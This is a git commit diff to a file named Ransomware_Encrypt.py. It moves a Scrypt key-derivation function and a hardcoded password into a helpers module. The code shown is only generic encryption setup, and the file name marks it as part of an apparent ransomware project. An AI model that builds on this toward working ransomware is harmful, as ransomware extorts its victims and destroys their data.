4dc0e1be7020dd02817f541d57e91cbc1f752db4
Wambita <wambitafana@gmail.com>
2026-03-02 16:08:24 +0300

    Feat: remove  redundant code and  reused existing code

--- Ransomware_Encrypt.py
+++ Ransomware_Encrypt.py
@@ -6,22 +6,8 @@ from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 import platform
+from helpers import derive_key, PASSWORD
 
-# predefined passoword
-PASSWORD = "my_secure_password"
-
-def derive_key(password: str, salt: bytes)-> bytes:
-    """Derive a key from the password using Scrypt KDF."""
-    kdf = Scrypt(
-        salt=salt,
-        length=32,
-        n=2**14,
-        r=8,
-        p=1,
-        backend=default_backend()
-    )
-    key = kdf.derive(password.encode())
-    return key
 
 def encrypt_data(data: bytes, password: str) -> bytes:
     """Encrypt the data using AES-256-CBC."""
